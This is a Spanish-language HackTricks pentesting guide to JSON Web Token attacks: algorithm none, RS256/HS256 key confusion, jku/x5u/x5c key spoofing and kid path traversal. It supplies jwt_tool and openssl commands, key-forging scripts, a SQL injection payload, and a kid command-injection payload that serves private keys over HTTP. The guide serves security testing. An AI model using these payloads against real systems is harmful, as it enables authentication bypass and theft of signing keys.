# Vulnerabilidades de JWT (Json Web Tokens)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si est√°s interesado en una **carrera de hacking** y hackear lo inhackeable - **¬°estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

**Parte de este post se basa en el incre√≠ble post:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor de la gran herramienta para pentesting de JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Victorias R√°pidas**

Ejecuta [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) con el modo `¬°Todas las Pruebas!` y espera l√≠neas verdes.
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Si tienes suerte, la herramienta encontrar√° alg√∫n caso en el que la aplicaci√≥n web est√© verificando incorrectamente el JWT:

![](<../.gitbook/assets/image (935).png>)

Luego, puedes buscar la solicitud en tu proxy o volcar el JWT utilizado para esa solicitud usando jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
Puedes usar la [**Extensi√≥n de Burp SignSaboteur**](https://github.com/d0ge/sign-saboteur) para lanzar ataques JWT desde Burp.

### Manipular datos sin modificar nada

Puedes simplemente manipular los datos dejando la firma tal como est√° y verificar si el servidor est√° comprobando la firma. Intenta cambiar tu nombre de usuario a "admin", por ejemplo.

#### **¬øSe verifica el token?**

Para comprobar si se est√° verificando la firma de un JWT:

* Un mensaje de error sugiere que se est√° realizando una verificaci√≥n; los detalles sensibles en errores verbosos deben ser revisados.
* Un cambio en la p√°gina devuelta tambi√©n indica verificaci√≥n.
* La ausencia de cambios sugiere que no hay verificaci√≥n; este es el momento de experimentar con la manipulaci√≥n de las afirmaciones del payload.

### Origen

Es importante determinar si el token fue generado del lado del servidor o del lado del cliente examinando el historial de solicitudes del proxy.

* Los tokens vistos por primera vez desde el lado del cliente sugieren que la clave podr√≠a estar expuesta al c√≥digo del lado del cliente, lo que requiere una investigaci√≥n adicional.
* Los tokens que se originan del lado del servidor indican un proceso seguro.

### Duraci√≥n

Verifica si el token dura m√°s de 24h... tal vez nunca expire. Si hay un campo "exp", verifica si el servidor lo est√° manejando correctamente.

### Fuerza bruta de la clave secreta HMAC

[**Consulta esta p√°gina.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modificar el algoritmo a Ninguno

Establece el algoritmo utilizado como "Ninguno" y elimina la parte de la firma.

Usa la extensi√≥n de Burp llamada "JSON Web Token" para probar esta vulnerabilidad y cambiar diferentes valores dentro del JWT (env√≠a la solicitud a Repeater y en la pesta√±a "JSON Web Token" puedes modificar los valores del token. Tambi√©n puedes seleccionar poner el valor del campo "Alg" a "Ninguno").

### Cambiar el algoritmo RS256 (asim√©trico) a HS256 (sim√©trico) (CVE-2016-5431/CVE-2016-10555)

El algoritmo HS256 utiliza la clave secreta para firmar y verificar cada mensaje.\
El algoritmo RS256 utiliza la clave privada para firmar el mensaje y utiliza la clave p√∫blica para la autenticaci√≥n.

Si cambias el algoritmo de RS256 a HS256, el c√≥digo del backend utiliza la clave p√∫blica como la clave secreta y luego utiliza el algoritmo HS256 para verificar la firma.

Luego, usando la clave p√∫blica y cambiando RS256 a HS256 podr√≠amos crear una firma v√°lida. Puedes recuperar el certificado del servidor web ejecutando esto:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nueva clave p√∫blica dentro del encabezado

Un atacante incrusta una nueva clave en el encabezado del token y el servidor utiliza esta nueva clave para verificar la firma (CVE-2018-0114).

Esto se puede hacer con la extensi√≥n "JSON Web Tokens" de Burp.\
(Env√≠a la solicitud al Repeater, dentro de la pesta√±a JSON Web Token selecciona "CVE-2018-0114" y env√≠a la solicitud).

### Suplantaci√≥n de JWKS

Las instrucciones detallan un m√©todo para evaluar la seguridad de los tokens JWT, particularmente aquellos que emplean un reclamo de encabezado "jku". Este reclamo debe vincularse a un archivo JWKS (JSON Web Key Set) que contenga la clave p√∫blica necesaria para la verificaci√≥n del token.

* **Evaluaci√≥n de Tokens con Encabezado "jku"**:
* Verifica la URL del reclamo "jku" para asegurarte de que conduzca al archivo JWKS apropiado.
* Modifica el valor "jku" del token para dirigirlo hacia un servicio web controlado, permitiendo la observaci√≥n del tr√°fico.
* **Monitoreo de Interacci√≥n HTTP**:
* Observar las solicitudes HTTP a tu URL especificada indica los intentos del servidor de obtener claves desde tu enlace proporcionado.
* Al emplear `jwt_tool` para este proceso, es crucial actualizar el archivo `jwtconf.ini` con tu ubicaci√≥n personal de JWKS para facilitar la prueba.
* **Comando para `jwt_tool`**:
*   Ejecuta el siguiente comando para simular el escenario con `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Visi√≥n General de Problemas de Kid

Un reclamo de encabezado opcional conocido como `kid` se utiliza para identificar una clave espec√≠fica, lo que se vuelve particularmente vital en entornos donde existen m√∫ltiples claves para la verificaci√≥n de la firma del token. Este reclamo ayuda a seleccionar la clave apropiada para verificar la firma de un token.

#### Revelando Clave a trav√©s de "kid"

Cuando el reclamo `kid` est√° presente en el encabezado, se recomienda buscar en el directorio web el archivo correspondiente o sus variaciones. Por ejemplo, si se especifica `"kid":"key/12345"`, se deben buscar los archivos _/key/12345_ y _/key/12345.pem_ en la ra√≠z web.

#### Traversal de Ruta con "kid"

El reclamo `kid` tambi√©n podr√≠a ser explotado para navegar a trav√©s del sistema de archivos, permitiendo potencialmente la selecci√≥n de un archivo arbitrario. Es factible probar la conectividad o ejecutar ataques de Server-Side Request Forgery (SSRF) al alterar el valor de `kid` para apuntar a archivos o servicios espec√≠ficos. Manipular el JWT para cambiar el valor de `kid` mientras se mantiene la firma original se puede lograr utilizando la bandera `-T` en jwt\_tool, como se demuestra a continuaci√≥n:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Al apuntar a archivos con contenido predecible, es posible falsificar un JWT v√°lido. Por ejemplo, el archivo `/proc/sys/kernel/randomize_va_space` en sistemas Linux, conocido por contener el valor **2**, puede ser utilizado en el par√°metro `kid` con **2** como la contrase√±a sim√©trica para la generaci√≥n de JWT.

#### Inyecci√≥n SQL a trav√©s de "kid"

Si el contenido de la declaraci√≥n `kid` se utiliza para obtener una contrase√±a de una base de datos, se podr√≠a facilitar una inyecci√≥n SQL modificando la carga √∫til de `kid`. Un ejemplo de carga √∫til que utiliza inyecci√≥n SQL para alterar el proceso de firma de JWT incluye:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Esta alteraci√≥n obliga al uso de una clave secreta conocida, `ATTACKER`, para la firma de JWT.

#### Inyecci√≥n de OS a trav√©s de "kid"

Un escenario donde el par√°metro `kid` especifica una ruta de archivo utilizada dentro de un contexto de ejecuci√≥n de comandos podr√≠a llevar a vulnerabilidades de Ejecuci√≥n Remota de C√≥digo (RCE). Al inyectar comandos en el par√°metro `kid`, es posible exponer claves privadas. Un ejemplo de carga √∫til para lograr RCE y exposici√≥n de claves es:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u y jku

#### jku

jku significa **JWK Set URL**.\
Si el token utiliza una declaraci√≥n de **Header** ‚Äú**jku**‚Äù, entonces **verifica la URL proporcionada**. Esto deber√≠a apuntar a una URL que contenga el archivo JWKS que tiene la Clave P√∫blica para verificar el token. Modifica el token para que el valor de jku apunte a un servicio web que puedas monitorear.

Primero necesitas crear un nuevo certificado con nuevas claves privadas y p√∫blicas.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Luego puedes usar por ejemplo [**jwt.io**](https://jwt.io) para crear el nuevo JWT con las **claves p√∫blicas y privadas creadas y apuntando el par√°metro jku al certificado creado.** Para crear un certificado jku v√°lido, puedes descargar el original y cambiar los par√°metros necesarios.

Puedes obtener los par√°metros "e" y "n" de un certificado p√∫blico usando:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. Un URI que apunta a un conjunto de certificados p√∫blicos X.509 (un est√°ndar de formato de certificado) codificados en forma PEM. El primer certificado en el conjunto debe ser el que se utiliz√≥ para firmar este JWT. Los certificados subsiguientes firman cada uno el anterior, completando as√≠ la cadena de certificados. X.509 est√° definido en RFC 52807. Se requiere seguridad de transporte para transferir los certificados.

Intenta **cambiar este encabezado a una URL bajo tu control** y verifica si se recibe alguna solicitud. En ese caso, **podr√≠as manipular el JWT**.

Para forjar un nuevo token utilizando un certificado controlado por ti, necesitas crear el certificado y extraer las claves p√∫blica y privada:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Luego puedes usar por ejemplo [**jwt.io**](https://jwt.io) para crear el nuevo JWT con las **claves p√∫blicas y privadas creadas y apuntando el par√°metro x5u al certificado .crt creado.**

![](<../.gitbook/assets/image (956).png>)

Tambi√©n puedes abusar de ambas vulnerabilidades **para SSRFs**.

#### x5c

Este par√°metro puede contener el **certificado en base64**:

![](<../.gitbook/assets/image (1119).png>)

Si el atacante **genera un certificado autofirmado** y crea un token falsificado usando la clave privada correspondiente y reemplaza el valor del par√°metro "x5c" con el certificado reci√©n generado y modifica los otros par√°metros, a saber, n, e y x5t, entonces esencialmente el token falsificado ser√≠a aceptado por el servidor.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Clave P√∫blica Embebida (CVE-2018-0114)

Si el JWT tiene una clave p√∫blica embebida como en el siguiente escenario:

![](<../.gitbook/assets/image (624).png>)

Usando el siguiente script de nodejs es posible generar una clave p√∫blica a partir de esos datos:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Es posible generar una nueva clave privada/p√∫blica, incrustar la nueva clave p√∫blica dentro del token y usarla para generar una nueva firma:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Puedes obtener el "n" y "e" usando este script de nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finalmente, utilizando la clave p√∫blica y privada y los nuevos valores "n" y "e", puedes usar [jwt.io](https://jwt.io) para forjar un nuevo JWT v√°lido con cualquier informaci√≥n.

### ES256: Revelando la clave privada con el mismo nonce

Si algunas aplicaciones utilizan ES256 y usan el mismo nonce para generar dos jwts, la clave privada puede ser restaurada.

Aqu√≠ hay un ejemplo: [ECDSA: Revelando la clave privada, si se usa el mismo nonce (con SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

El reclamo JTI (JWT ID) proporciona un identificador √∫nico para un token JWT. Se puede utilizar para evitar que el token sea reproducido.\
Sin embargo, imagina una situaci√≥n donde la longitud m√°xima del ID es 4 (0001-9999). Las solicitudes 0001 y 10001 van a usar el mismo ID. As√≠ que si el backend est√° incrementando el ID en cada solicitud, podr√≠as abusar de esto para **repetir una solicitud** (necesitando enviar 10000 solicitudes entre cada repetici√≥n exitosa).

### JWT Registered claims

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Otros ataques

**Ataques de Relay entre servicios**

Se ha observado que algunas aplicaciones web dependen de un servicio JWT de confianza para la generaci√≥n y gesti√≥n de sus tokens. Se han registrado casos donde un token, generado para un cliente por el servicio JWT, fue aceptado por otro cliente del mismo servicio JWT. Si se observa la emisi√≥n o renovaci√≥n de un JWT a trav√©s de un servicio de terceros, se debe investigar la posibilidad de registrarse en una cuenta en otro cliente de ese servicio utilizando el mismo nombre de usuario/correo electr√≥nico. Luego, se debe intentar reproducir el token obtenido en una solicitud al objetivo para ver si es aceptado.

* Un problema cr√≠tico puede ser indicado por la aceptaci√≥n de tu token, lo que podr√≠a permitir la suplantaci√≥n de la cuenta de cualquier usuario. Sin embargo, se debe tener en cuenta que puede ser necesario obtener permiso para pruebas m√°s amplias si se registra en una aplicaci√≥n de terceros, ya que esto podr√≠a entrar en un √°rea gris legal.

**Verificaci√≥n de Expiraci√≥n de Tokens**

La expiraci√≥n del token se verifica utilizando el reclamo "exp" del Payload. Dado que los JWT a menudo se emplean sin informaci√≥n de sesi√≥n, se requiere un manejo cuidadoso. En muchos casos, capturar y reproducir el JWT de otro usuario podr√≠a permitir la suplantaci√≥n de ese usuario. El RFC de JWT recomienda mitigar los ataques de repetici√≥n de JWT utilizando el reclamo "exp" para establecer un tiempo de expiraci√≥n para el token. Adem√°s, es crucial la implementaci√≥n de verificaciones relevantes por parte de la aplicaci√≥n para asegurar el procesamiento de este valor y el rechazo de tokens expirados. Si el token incluye un reclamo "exp" y los l√≠mites de tiempo de prueba lo permiten, se aconseja almacenar el token y reproducirlo despu√©s de que haya pasado el tiempo de expiraci√≥n. El contenido del token, incluyendo el an√°lisis de la marca de tiempo y la verificaci√≥n de expiraci√≥n (marca de tiempo en UTC), se puede leer utilizando la bandera -R de jwt_tool.

* Puede haber un riesgo de seguridad si la aplicaci√≥n a√∫n valida el token, ya que esto podr√≠a implicar que el token nunca podr√≠a expirar.

### Herramientas

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si est√°s interesado en una **carrera de hacking** y en hackear lo inhackeable - **¬°estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
